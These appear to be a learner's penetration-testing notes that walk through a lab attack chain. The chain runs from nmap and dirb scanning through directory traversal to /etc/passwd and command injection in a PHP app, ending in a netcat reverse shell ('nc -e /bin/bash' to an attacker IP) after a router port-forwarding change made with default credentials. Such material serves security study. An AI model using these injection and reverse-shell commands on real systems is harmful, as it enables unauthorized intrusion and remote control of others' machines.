1. ## Concept and Organization: 

What is a shell? A shell is a way for a user to interface with a computer OS. Normally either a Graphic User Interface (GUI) or a Command Line Interface (CLI).

What is a reverse shell? You (the attacker) don’t make a connection with the target (victim’s computer) with a shell. But the victim’s computer is tricked into connecting with its shell to your computer.

Think of it like secretly planting a phone in the target computer, and when you call, it answers, allowing you to control it remotely.

A reverse shell requires 3 things: a listener, a port forwarding rule, and a payload. 

Before we get started in earnest , its important to keep your penetration efforts organized. so first thing first. Use the [[Basic command]] <span style="color:#00b050">mkdir</span> and then the name of your directory, for me it will be "pentest". 
![[Pasted image 20231208192215.png]]
After this we will take the victim ip address and insert it into the file (scope) we just named with the [[Basic command]] <span style="color:#00b050">nano</span> and the ip address you have for your victim network/host

2. ## NMAP
We can then [[Nmap]] the network with this #basic-nmap-command: sudo nmap -iL scope -F | tee fast_scan ". Which will create a file called "fast_scan" that contains our basic nmap scan of the ip address contained in the file "scope".

<span style="color:#ed8207"><span style="color:#0070c0">(Note: " | " is called a pipe and is a device used to connect the output of one command to the input of another, if you just wish to view the scan without creating a file disregard the | and anything after)
</span></span>

Remember to validate what you did with the [[Basic command]] <span style="color:#00b050">ls</span> which shows the content of your directory. 

You can also look at the contents of that file with the [[Basic command]] <span style="color:#00b050">cat</span>.
![[Pasted image 20231208195513.png]]
So this is what [[Nmap]] does, it scans for open [[Port]]s and returns a list of them. The #HTTP port 80 is open and that is for unsecured web browsing. 


3. ## Using the Open Port
Since port 80 is open, which is #HTTP , you can interact with it via a web browser. So, if our target network is 192.168.122.47 then we’d open, say, Firefox and slap that address in the URL bar. You are now interacting with the server that belongs to that ip address port, i.e., a webserver. (Viewing webpages).
![[Pasted image 20231209103109.png]]
Start by viewing the page, and then right clicking and viewing the “page source” and view the source code that is the backbone of the web page you are viewing.

But what you’re looking for is hidden “endpoints”, that is, directories and files that aren’t directly accessible via the web app you are looking at. (no hyperlink or site map to take you to all the pages). We can do this buy using 

4. ## Off to the Dir-B
[[DIRB]] discovers hidden directories and files on a web server by launching a dictionary-based attack. The command is generally: “<span style="color:#00b050">dirb</span> http://{ipaddress}/ ("-o file_name" to make an output file)
![[Pasted image 20231209122523.png]]
Using this you can visit all the directories that are not obvious and see if there are vulnerabilities, such as other information such as OS or Service operating and their versions, IP addresses, ports in use, or any php apps etc etc. (Make sure you record all vulnerabilities you find)

For instance, let's say dirb found 192.168.122.47/console/view.php which is the vulnerability we will exploit.

5. ## Searching for a Web Application Vulnerability
PHP (Hypertext Preprocessor) is a popular general-purpose scripting language that is especially suited for web development. It is a server-side scripting language, meaning that PHP code is executed on the server rather than on the client's browser.

The fist thing to do is to validate the app is working, i.e. do the credentials/forms work?
![[Pasted image 20231209123031.png]]

Here we are trying to read the “current files in the directory:” i.e., humans.txt, robots.txt, etc. We likely couldn’t read this without a proper username or admin ID. That we can is **“Unexpected Behavior”**; this is a “high” vulnerability, known as “broken authentication,” which is probably why we can access these protected files. (This is unlikely to be found in the real world but test it anyway here the admin name and ID forms are broken). So, if you can read these files. Maybe you can read others.  Like… etc/shadow or etc/passwd (remember that most web servers operate on Linux)
![[Pasted image 20231209123209.png]]

However, it’s not providing that file. It gave no output. We know it isn’t a “permission” issue. Not only is the admin name and id broken. But /etc/passwd is a world readable (all users can access it), so it’s not a permission issue. It must be a location address issue from what we are typing in.

Basically, we are typing the address for the file in wrong way… or not in the clever way. Let's try Directory Traversal. 

6. ## Directory Traversal
Typing out long directory addresses can be tedious and easy to make errors, so by using “/../../” as a filler, linux will automatically find the directory we are looking for if used correctly, see below:
![[Pasted image 20231209124437.png]]

So we just do the same in our php app:
![[Pasted image 20231209124504.png]]
And…. Success:
![[Pasted image 20231209124512.png]]
<span style="color:#0070c0">(This is a medium to high vulnerability, it gives all the user accounts, and that’s half the battle. Remember to record this in your report, this would be a directory traversal vulnerability, the fix for it would be input validation and sanitization)</span>

<span style="color:#0070c0">(Note make sure to view</span> [[Command Execution]]<span style="color:#0070c0"> for tips on how to send multiple commands and inputs at once)
</span>
7. ## Command Line Injection
How would we use this in our php app? The command “id” displays user and group information for a process or file. So, if were to use that in conjunction “;” with the files we want to access, we would see:
![[Pasted image 20231209125546.png]]
Or simply the command itself:
![[Pasted image 20231209125600.png]]
This is **Remote Command Execution (RCE)** and it is exactly what we are going for in penetration testing.

You can RCE now. That means you can finally make a Reverse Shell:
Remember the three-part process:

<span style="color:#0070c0">_1    Listener (think: 'thing that catches reverse shell')_</span>
<span style="color:#0070c0">_2   Port Forwarding rule (think: 'thing that forwards reverse shell from router to kali')_</span>
<span style="color:#0070c0">_3   Payload (think: 'thing that sends you a reverse shell')</span>

8. ## Netcat Listener
We use [[Netcat]] to set up our #Basic-listener command <span style="color:#00b050">nc -lvp Port#</span> 
![[Pasted image 20231209101842.png]]
So here we have set up a port on our machine to listen for any traffic that will come our way. That step is port forwarding which we will cover later.

We can validate this step with the [[Basic command]] of <span style="color:#00b050">netstat -natp</span>. 
![[Pasted image 20231209102610.png]]

9. ## Port Forwarding
#port-forwarding We need to configure our router/gateway/firewall. So first let's find it with a simple route -n command:
![[Pasted image 20231209130932.png]]

Our router is then 192.168.2.1 and this is the device that will serve as our “port forwarding rule” platform.
![[Pasted image 20231209131014.png]]
Where to find the default credentials for a router? Use Google. (again, default credentials are not usually found in the real world, but worth a shot)

Once you’re in Go to “Firewall” and then “NAT”
![[Pasted image 20231209131053.png]]
We “add” a rule and go to the configuration page. We’ll need to know our IP address so a quick “ifconfig” will give us that. And we need to remember our port that we set up with “nc” (here 4444)

And we insert this info into the destination forms on our “rule page” hence directing traffic to our port on our machine.
![[Pasted image 20231209131149.png]]
Then save: Always apply changes after saving.

10. ## The Payload + RevShell
#Revshell last part we are at here is the “payload.”… Remember how we have access to our web-server admin portal and how we can run command lines now? The first thing you want to do is head over to https://revshells.com and use this service that well generate reverse shells for you as well as listener commands. It takes some time to know which shell will work, but in this case is will be a simple nc -c command: 
![[Pasted image 20231209132119.png]]
We use the command: “<span style="color:#00b050">;nc -e /bin/bash 192.168.122.209 4444</span>”, we need to know why we are using 192.168.122.209 first. It is the IP address of the router (not the gateway address) that we are using for our port forwarding rule.![[Pasted image 20231209132208.png]]
![[Pasted image 20231209132234.png]]
The command will “hang” for a bit, because it’s not going to it’s web server’s network, but to ours

**(Note: remember that netcat stands for network concatenate, which in simple terms means the joining of two networks, which we have just done.**

Now we just validate what we just did, we go back to our <span style="color:#00b050">nc -nlvp</span> screen on our kali machine. And we should see the connection established:
![[Pasted image 20231209132316.png]]
